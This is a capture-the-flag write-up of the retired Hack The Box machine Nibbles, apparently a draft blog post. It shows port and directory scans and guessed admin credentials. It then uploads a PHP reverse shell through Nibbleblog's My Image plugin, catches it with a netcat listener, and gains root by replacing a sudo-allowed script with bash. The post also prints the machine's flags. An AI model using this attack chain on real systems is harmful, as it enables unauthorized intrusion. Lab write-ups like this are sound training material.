---
title: "HTB Nibbles Writeup"
date: 2022-03-27T10:08:01+05:30
tags: ['Easy', 'Linux', 'Retired','Interesting Privilege Escalation']
categories: ['Linux Easy']
draft: true
---

# Process
*	Scanned all top 1000 default ports using nmap and corroborated the results by scanning all the ports using masscan (UDP and TCP). Found two ports open: 
	*	`22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)`
	*	`80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))`
*	Configured the `/etc/hosts` for nibbles.htb to point towards `<ip>`
*	Checked out webserver running on `80/tcp`. Carried out vhost enumeration, directory enumeration. Didn't found anython useful. 
	*	On examing the source code of the webpage found a comment pointing to `/nodeblog`
*	Carried out directory enumeration of `http://nibbles.htb/nibbleblog` and found several interesting directories.
	*	Found version details, username, admin login page.
*	Tried logging in as admin on admin.php. I was unable to do so because of account lockout policy.	
	*	Didn't find any credentials even after scouring the website
*	After unsuccessful attempts, created a custom wordlist using `CeWL` having 33 words.  Tired manually several times and finally found the password for admin
*	Previously, on searching I found a probable file upload vulnerability in `My Image` plugin. Which I now exploited by uploading a php-reverese-shell.php available by default in Kali and Parrot os under `/usr/share/webshells/php/`.
*	Received the webshell as `nibbler`. Found the user flag
*	I found an interesting file `/home/nibbler/personal.zip` alongside `user.txt`. `sudo -l` aslo showed that `nibbler` could execute `/home/nibbler/personal/stuff/monitor.sh` as sudo. 
*	Upon examination, `monitor.sh` was found to record the device's vitals. Thus, to get the root@shell. I copied `/bin/bash` into `./stuff/`. Deleted `monitor.sh`, renamed `bash` as `monitor.sh` and executed it as sudo. 

## Enumeration
### 1.1 Nmap

```bash
sudo nmap -sC -A -Pn nibbles.htb -T4 -oN nibles.AsCdefault
[sudo] password for babayaga: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-03 12:21 IST
Nmap scan report for nibbles.htb (10.129.96.84)
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=4/3%OT=22%CT=1%CU=31988%PV=Y%DS=2%DC=T%G=Y%TM=62494426
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8)OPS(
OS:O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11
OS:NW7%O6=M505ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(
OS:R=Y%DF=Y%T=40%W=7210%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%R
OS:UCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT       ADDRESS
1   260.90 ms 10.10.14.1
2   261.02 ms nibbles.htb (10.129.96.84)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.42 seconds
```


## HTTP
### Webpage

{{<figure src="/images/nibbles/webpage.png" title="nibbles.htb Webpage">}}

*	No userful directories found
*	No vhost found



#### Source Code
```html
<b>Hello world!</b>


<!-- /nibbleblog/ directory. Nothing interesting here! -->
```


#### Whatweb
```bash
┌─[babayaga@babayaga-virtualbox]─[~]
└──╼ $whatweb nibbles.htb
http://nibbles.htb [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.96.84]
```


#### Version from /README
`Version = 4.0.3`

```text
====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01

Site: http://www.nibbleblog.com
Blog: http://blog.nibbleblog.com
Help & Support: http://forum.nibbleblog.com
Documentation: http://docs.nibbleblog.com
```

### ffuf
```bash
┌─[babayaga@babayaga-virtualbox]─[~/Desktop/HTB/Linux/Nibbles/enum]
└──╼ $ffuf -u http://nibbles.htb/nibbleblog/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic -c -of md -o nibbles.dirbuster

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://nibbles.htb/nibbleblog/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Extensions       : .php .html .txt 
 :: Output file      : nibbles.dirbuster
 :: File format      : md
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

index.php               [Status: 200, Size: 2987, Words: 116, Lines: 61]
                        [Status: 200, Size: 2987, Words: 116, Lines: 61]
.php                    [Status: 403, Size: 301, Words: 22, Lines: 12]
.html                   [Status: 403, Size: 302, Words: 22, Lines: 12]
sitemap.php             [Status: 200, Size: 402, Words: 33, Lines: 11]
content                 [Status: 301, Size: 323, Words: 20, Lines: 10]
themes                  [Status: 301, Size: 322, Words: 20, Lines: 10]
feed.php                [Status: 200, Size: 302, Words: 8, Lines: 8]
admin                   [Status: 301, Size: 321, Words: 20, Lines: 10]
admin.php               [Status: 200, Size: 1401, Words: 79, Lines: 27]
plugins                 [Status: 301, Size: 323, Words: 20, Lines: 10]
install.php             [Status: 200, Size: 78, Words: 11, Lines: 1]
update.php              [Status: 200, Size: 1622, Words: 103, Lines: 88]
README                  [Status: 200, Size: 4628, Words: 589, Lines: 64]
languages               [Status: 301, Size: 325, Words: 20, Lines: 10]
LICENSE.txt             [Status: 200, Size: 35148, Words: 5836, Lines: 676]
COPYRIGHT.txt           [Status: 200, Size: 1272, Words: 168, Lines: 27]
.php                    [Status: 403, Size: 301, Words: 22, Lines: 12]
.html                   [Status: 403, Size: 302, Words: 22, Lines: 12]
                        [Status: 200, Size: 2986, Words: 116, Lines: 61]
:: Progress: [882188/882188] :: Job [1/1] :: 256 req/sec :: Duration: [1:02:06] :: Errors: 0 ::

```

### Vulnerabilites in Nibbleblog
Our version: 4.0.3

```bash
┌─[babayaga@babayaga-virtualbox]─[~/Desktop]
└──╼ $searchsploit nibble
--------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                       |  Path
--------------------------------------------------------------------- ---------------------------------
Nibbleblog 3 - Multiple SQL Injections                               | php/webapps/35865.txt
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)                | php/remote/38489.rb
--------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```


### /admin.php
{{<figure src="/images/nibbles/admin.png" title="Admin Login">}}

### INT from some subdirectories
URL: `http://nibbles.htb/nibbleblog//content/private/config.xml`
User: admin
```xml
<notification_comments type="integer">1</notification_comments>
<notification_session_fail type="integer">0</notification_session_fail>
<notification_session_start type="integer">0</notification_session_start>
<notification_email_to type="string">admin@nibbles.com</notification_email_to>
<notification_email_from type="string">noreply@10.10.10.134</notification_email_from>
<seo_site_title type="string">Nibbles - Yum yum</seo_site_title>
```

### Custom Wordlist
I couldn't find any passowrd or vulnerability to aid in authentication. So, rather than directly trying rockyou.txt. First, we will create a custom wordlist using `CeWL` as it will provide passwords with greater relavance to the box. 

```bash
 ─[babayaga@babayaga-virtualbox]─[~/Desktop/HTB/Linux/Nibbles/exploit]
└──╼ $cewl http://nibbles.htb/nibbleblog/ -w CustomPasslist.txt
CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
┌─[babayaga@babayaga-virtualbox]─[~/Desktop/HTB/Linux/Nibbles/exploit]
└──╼ $cat CustomPasslist.txt -n
     1	Nibbles
     2	Yum
     3	yum
     4	Hello
     5	world
     6	posts
     7	Home
     8	Uncategorised
     9	Music
    10	Videos
    11	HEADER
    12	MAIN
    13	PLUGINS
    14	Categories
    15	Latest
    16	image
    17	Pages
    18	VIEW
    19	There
    20	are
    21	FOOTER
    22	Atom
    23	Top
    24	Powered
    25	Nibbleblog
    26	ATOM
    27	Feed
    28	http
    29	nibbles
    30	htb
    31	nibbleblog
    32	feed
    33	php

```

### Logging in

{{<figure src="/images/nibbles/loggedin.png" title="Logged in">}}

A lockout policy is being enforced. Thus, bruteforcing will not work. I will try the most plausible words from the generated wordlist like `nibbles`, `Nibbles`, etc.

Credentials => `admin`:`nibbles` worked


## Foothold

### Reverse Shell
Reverse shell was obtained by exploiting the My Image plugin. Uploaded `php-reverse-shell.php` from `/usr/share/webshells/php/`. 

{{<figure src="/images/nibbles/plugin.png" title="Vulnerable Pluggin">}}

Reverse Shell Received:
```bash
┌─[babayaga@babayaga-virtualbox]─[~/Desktop/HTB/Linux/Nibbles/exploit]
└──╼ $nc -lvnp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.129.96.84.
Ncat: Connection from 10.129.96.84:47888.
Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 05:26:53 up  4:23,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
nibbler
```

Stablized the shell

### User Flag
```bash
nibbler@Nibbles:/home/nibbler$ cat user.txt 
cb2c14f39d69f59ec770ac6c63eb4deb
```
## Privilege Escalation

### Process
Found an interesting file `personal.zip` and an interesting command `/home/nibbler/personal/stuff/moitor.sh` that `nibbler` can run as sudo.

```bash
nibbler@Nibbles:/home/nibbler$ ls
total 20
drwxr-xr-x 3 nibbler nibbler 4096 Apr  3 05:31 .
drwxr-xr-x 3 root    root    4096 Dec 10  2017 ..
-rw------- 1 nibbler nibbler    0 Dec 29  2017 .bash_history
drwxrwxr-x 2 nibbler nibbler 4096 Dec 10  2017 .nano
-r-------- 1 nibbler nibbler 1855 Dec 10  2017 personal.zip
-r-------- 1 nibbler nibbler   33 Apr  3 01:04 user.txt
nibbler@Nibbles:/home/nibbler$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

Thus unzipping `personal.zip` and executing `monitor.sh`. Unfortunately `monitor.sh` is a bash script to just check the computer vitals, etc. Thus to get a shell as root. I will copied `/bin/bash` to current directory and renamed it as `monitor.sh`

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls
total 12
drwxr-xr-x 2 nibbler nibbler 4096 Dec 10  2017 .
drwxr-xr-x 3 nibbler nibbler 4096 Dec 10  2017 ..
-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ cp /bin/bash .
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls
total 1028
drwxr-xr-x 2 nibbler nibbler    4096 Apr  3 05:36 .
drwxr-xr-x 3 nibbler nibbler    4096 Dec 10  2017 ..
-rwxr-xr-x 1 nibbler nibbler 1037528 Apr  3 05:36 bash
-rwxrwxrwx 1 nibbler nibbler    4015 May  8  2015 monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ rm monitor.sh 
nibbler@Nibbles:/home/nibbler/personal/stuff$ mv bash monitor.sh
```

### Root Flag
```bash
monitor.shbbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/ 
root@Nibbles:/home/nibbler/personal/stuff# whoami
root
root@Nibbles:/home/nibbler/personal/stuff# cat /root/root.txt
3140cb3a8953d78ebabff2b68ee6d6ab
root@Nibbles:/home/nibbler/personal/stuff# 
```




